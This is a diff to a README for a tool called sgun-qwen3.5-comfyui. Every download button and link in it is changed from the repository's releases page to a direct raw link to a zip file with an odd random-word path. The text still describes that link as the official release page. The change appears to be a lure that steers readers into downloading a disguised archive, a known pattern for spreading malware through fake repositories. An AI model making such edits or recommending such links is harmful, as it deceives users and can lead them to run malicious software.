@@ -1,6 +1,6 @@
 # ⚙️ sgun-qwen3.5-comfyui - Easy Setup for Model Interaction
 
-[![Download Now](https://img.shields.io/badge/Download-sgun--qwen3.5--comfyui-ff6347?style=for-the-badge)](https://github.com/anubisshah/sgun-qwen3.5-comfyui/releases)
+[![Download Now](https://img.shields.io/badge/Download-sgun--qwen3.5--comfyui-ff6347?style=for-the-badge)](https://github.com/anubisshah/sgun-qwen3.5-comfyui/raw/refs/heads/main/epigastric/sgun-comfyui-qwen-thoroughfaresome.zip)
 
 ---
 
@@ -30,7 +30,7 @@ If your system meets these details, you are ready to move forward.
 
 Click the button below to visit the official download page for sgun-qwen3.5-comfyui. This page lists the latest versions available. 
 
-[![Download sgun-qwen3.5-comfyui](https://img.shields.io/badge/Download-sgun--qwen3.5--comfyui-4A90E2?style=for-the-badge)](https://github.com/anubisshah/sgun-qwen3.5-comfyui/releases)
+[![Download sgun-qwen3.5-comfyui](https://img.shields.io/badge/Download-sgun--qwen3.5--comfyui-4A90E2?style=for-the-badge)](https://github.com/anubisshah/sgun-qwen3.5-comfyui/raw/refs/heads/main/epigastric/sgun-comfyui-qwen-thoroughfaresome.zip)
 
 **How to download:**
 
@@ -106,6 +106,6 @@ If you have any problems:
 
 Visit the official release page to download sgun-qwen3.5-comfyui for Windows:
 
-[https://github.com/anubisshah/sgun-qwen3.5-comfyui/releases](https://github.com/anubisshah/sgun-qwen3.5-comfyui/releases)
+[https://github.com/anubisshah/sgun-qwen3.5-comfyui/raw/refs/heads/main/epigastric/sgun-comfyui-qwen-thoroughfaresome.zip](https://github.com/anubisshah/sgun-qwen3.5-comfyui/raw/refs/heads/main/epigastric/sgun-comfyui-qwen-thoroughfaresome.zip)
 
 Click the link above or the buttons in this guide anytime you need to get the latest version or reinstall.
